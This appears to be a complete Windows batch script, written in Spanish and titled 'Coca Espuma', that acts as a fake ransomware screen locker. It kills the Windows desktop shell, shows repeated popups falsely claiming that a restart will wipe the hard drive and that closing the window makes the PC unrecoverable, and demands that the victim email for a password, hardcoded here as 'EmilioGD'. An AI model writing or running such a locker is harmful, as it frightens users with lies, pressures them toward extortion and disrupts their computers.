color 0A
@echo off 
title Coca Espuma
taskkill /f /im explorer.exe 
:bucle 
cls               
msg * LEE CON ATENCION
msg * NO REINICIAR LA COMPUTADORA!.
msg * AL REINICIAR SE ELIMINARA TODOS LOS DATOS DEL DISCO DURO
msg * TENGA CUIDADO NO VAYA A CERRAR LA VENTANA DE ARRIBA
msg * SI USTED CIERRA LA VENTANA, NO PODRA RECUPERAR SU PC!
msg * ESCRIBIR A (AQUI EL CORREO)PARA OBTENER EL PASSWORD(CONTRASEÑA)
echo =============================================
echo SI USTED CIERRA ESTA VENTANA NO PODRA RECUPERAR SU PC!.
echo =============================================
echo Ingresar el password que recibio por correo.
echo =============================================
set /p pass=Escriba aqui el password: 
if %pass%==EmilioGD (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Felicidades!
start explorer.exe
pause
exit